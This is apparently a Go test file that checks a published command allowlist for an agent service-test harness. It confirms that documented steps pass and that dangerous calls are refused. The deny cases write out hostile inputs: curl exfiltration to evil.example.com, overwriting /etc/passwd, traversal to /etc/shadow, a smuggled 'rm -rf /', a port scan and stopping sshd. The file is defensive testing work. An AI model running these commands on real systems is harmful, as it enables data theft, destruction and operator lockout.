package command_test

// Guards the shipped service-test-harness allowlist profile
// (examples/service-test-harness/agent_config.harness.json, documented in
// docs/SERVICE_TESTING.md) by driving it through the REAL validator.
//
// The profile is a hand-maintained security boundary that we publish and
// invite operators to copy. An over-permissive regex in it is a vulnerability
// with our name on it, so the patterns are proven here rather than eyeballed.

import (
	"encoding/json"
	"os"
	"strings"
	"testing"

	"github.com/olafkfreund/myrmex-hive/pkg/command"
	"github.com/olafkfreund/myrmex-hive/pkg/config"
)

const harnessProfilePath = "../../examples/service-test-harness/agent_config.harness.json"

// allowlistVerdict reports whether the ALLOWLIST accepted a call, independent
// of whether the binary happens to be installed on this machine.
//
// validateCommand checks name+regex first and only then resolves the binary on
// PATH, so a missing `dig` must not read as "the regex rejected it" — that
// would make this test pass or fail on the runner's package list.
func allowlistVerdict(t *testing.T, name, args string, allow []config.AllowedCommand) bool {
	t.Helper()
	_, err := command.DryRun(name, splitArgs(args), allow)
	if err == nil {
		return true
	}
	if strings.Contains(err.Error(), "failed to resolve command") {
		return true // passed the allowlist; simply not installed here
	}
	return false
}

func loadHarnessProfile(t *testing.T) []config.AllowedCommand {
	t.Helper()
	raw, err := os.ReadFile(harnessProfilePath)
	if err != nil {
		t.Fatalf("shipped harness profile is missing: %v", err)
	}
	var cfg config.AgentConfig
	if err := json.Unmarshal(raw, &cfg); err != nil {
		t.Fatalf("shipped harness profile does not load as an AgentConfig: %v", err)
	}
	if len(cfg.AllowedCommands) == 0 {
		t.Fatal("shipped harness profile parsed to zero allowed commands")
	}
	return cfg.AllowedCommands
}

// A duplicate name is dead config: validateCommand takes the FIRST entry whose
// name matches and stops, so a second `curl` entry would never be consulted.
func TestHarnessProfileHasNoDuplicateCommandNames(t *testing.T) {
	seen := map[string]bool{}
	for _, c := range loadHarnessProfile(t) {
		if seen[c.Name] {
			t.Errorf("duplicate allowlist entry for %q — the second is unreachable; merge it into the first as a regex alternation", c.Name)
		}
		seen[c.Name] = true
	}
}

func TestHarnessProfileAllowsTheDocumentedWorkflow(t *testing.T) {
	allow := loadHarnessProfile(t)
	for _, c := range []struct{ name, args string }{
		{"/opt/myrmex/chaos.sh", "cpu 30 4"},
		{"/opt/myrmex/chaos.sh", "mem 60 512"},
		{"/opt/myrmex/chaos.sh", "latency 30 250 eth0"},
		{"/opt/myrmex/chaos.sh", "loss 15 10 ens5"},
		{"/opt/myrmex/chaos.sh", "kill TERM /run/myservice.pid"},
		{"/opt/myrmex/chaos.sh", "status"},
		{"curl", "-s -o /dev/null -w %{http_code}:%{time_total} --max-time 5 http://localhost:8080/healthz"},
		{"curl", "-s --max-time 5 http://myservice.internal/api/v1/status"},
		{"nc", "-z -w 2 db.internal 5432"},
		{"dig", "+short db.internal"},
		{"/opt/myrmex/apply-config.sh", "high-timeout"},
		{"systemctl", "restart myservice"},
		{"journalctl", "-u myservice -n 200 --no-pager"},
		{"ss", "-tlnp"},
	} {
		if !allowlistVerdict(t, c.name, c.args, allow) {
			t.Errorf("documented workflow step was REFUSED: %s %s", c.name, c.args)
		}
	}
}

// The calls the profile exists to refuse. Each is a plausible mistake or a
// real attack against a host running the harness.
func TestHarnessProfileDeniesTheDangerousCalls(t *testing.T) {
	allow := loadHarnessProfile(t)
	for _, c := range []struct{ why, name, args string }{
		{"chaos verb outside the fixed set", "/opt/myrmex/chaos.sh", "reboot 10 1"},
		{"duration beyond the cap", "/opt/myrmex/chaos.sh", "cpu 9999 4"},
		{"signal outside the permitted set", "/opt/myrmex/chaos.sh", "kill INT /run/myservice.pid"},
		{"killing a process that is not the target", "/opt/myrmex/chaos.sh", "kill TERM /run/sshd.pid"},
		{"exfiltration to an unpinned host", "curl", "-s --max-time 5 http://evil.example.com/steal"},
		{"unpinned host over https", "curl", "-s --max-time 5 https://evil.example.com/"},
		{"curl overwriting a system file", "curl", "-s -o /etc/passwd --max-time 5 http://localhost:8080/x"},
		{"port-scanning a third party", "nc", "-z -w 2 10.0.0.5 22"},
		{"restarting a service that is not under test", "systemctl", "restart sshd"},
		{"stopping sshd — locking the operator out", "systemctl", "stop sshd"},
		{"path traversal as a config variant", "/opt/myrmex/apply-config.sh", "../../etc/shadow"},
		{"shell metacharacter smuggling", "/opt/myrmex/chaos.sh", "status; rm -rf /"},
		{"trailing-argument padding (the #151 substring class)", "systemctl", "restart myservice extra"},
		{"a command that is not on the list at all", "bash", "-c whoami"},
	} {
		if allowlistVerdict(t, c.name, c.args, allow) {
			t.Errorf("SHOULD BE DENIED (%s) but the allowlist approved: %s %s", c.why, c.name, c.args)
		}
	}
}

// splitArgs mirrors how the agent hands argv to the validator: already split,
// no shell involved.
func splitArgs(s string) []string {
	if s == "" {
		return nil
	}
	return strings.Split(s, " ")
}
